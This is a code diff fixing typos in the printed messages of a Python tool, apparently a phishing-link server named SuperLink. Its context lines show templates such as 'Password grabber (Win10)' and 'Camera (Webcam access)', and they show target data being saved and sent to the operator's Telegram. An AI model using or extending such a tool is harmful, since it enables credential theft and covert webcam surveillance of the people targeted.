@@ -294,13 +294,13 @@ def check_updates():
     elif updater.checkForUpdates is None:
         tprint.out(LY + " [!] Something went wrong!!!")
         win10notif("Something went wrong!",
-                   "Something unknown happend while checking for new update!\nplease check your network connection.",
+                   "Something unknown happened while checking for new update!\nplease check your network connection.",
                    icon="./Modules/icons/red_cross.ico")
     else:
         tprint.out(LY + f" [!] There is a new update available! (" +
                    LR + f"v{updater.checkForUpdates}" + LY + ")")
         win10notif("New update available!",
-                   f"A new update realesed on github by the author (IHosseini)\nnew version: {updater.checkForUpdates}",
+                   f"A new update released on github by the author (IHosseini)\nnew version: {updater.checkForUpdates}",
                    icon="./Modules/icons/exclamation_mark.ico")
         up_file = f"SuperLink-v{updater.checkForUpdates}.zip"
         select_down = input("\n\n" + LG + " [" + LR + "?" + LG + "]" +
@@ -319,7 +319,7 @@ def check_updates():
                 tprint.out(LG + f" [>] Extracting new update file ({up_file})...")
                 sleep(2)
                 up_downloader.extract(f"../{up_file}", path=f"../{up_file}".replace(".zip", ""))
-                tprint.out(LG + f" [>] Update file successfully extractrd in " +
+                tprint.out(LG + f" [>] Update file successfully extracted in " +
                            LW + f"[../{up_file}]".replace(".zip", ""))
             except Exception as error:
                 tprint.out(LR + f" [>] Something went wrong while updating!")
@@ -399,7 +399,7 @@ class MainServer:
                     self.tprint.out(
                         LG + " [>] The link have been sent to your " + LW + "telegram" + LG + " successfully!\n")
                 except:
-                    self.tprint.out(LR + " [>]" + LY + " Faild to send the link to your " +
+                    self.tprint.out(LR + " [>]" + LY + " Failed to send the link to your " +
                                     LW + "telegram " + LY + "!")
                     print("")
                 print(LR + "\n --------------------------------- \n")
@@ -447,7 +447,7 @@ class MainServer:
         temp_path_li = ["./Templates/Music Player", "./Templates/Smiling Moon",
                         "./Templates/NearYou", "./Templates/Camera (Webcam access)",
                         "./Templates/Password grabber (Win10)",
-                        "./Templates/Weather forcast"]
+                        "./Templates/Weather forecast"]
         tprint = TMprint()
         number_of_target = 1
         file_path_info = "./Logs/Saved-Info/Info.json"
@@ -537,7 +537,7 @@ class MainServer:
                         tprint.out(LG + " [>] Data file successfully sent to your" + LW + " telegram" + LG + " !")
                         print("")
                     except:
-                        tprint.out(LR + " [>]" + LY + " Faild to send the target data to your " +
+                        tprint.out(LR + " [>]" + LY + " Failed to send the target data to your " +
                                    LW + "telegram " + LY + "! (check your connection)")
                         print("")
                     win10notif("Data successfully saved!",
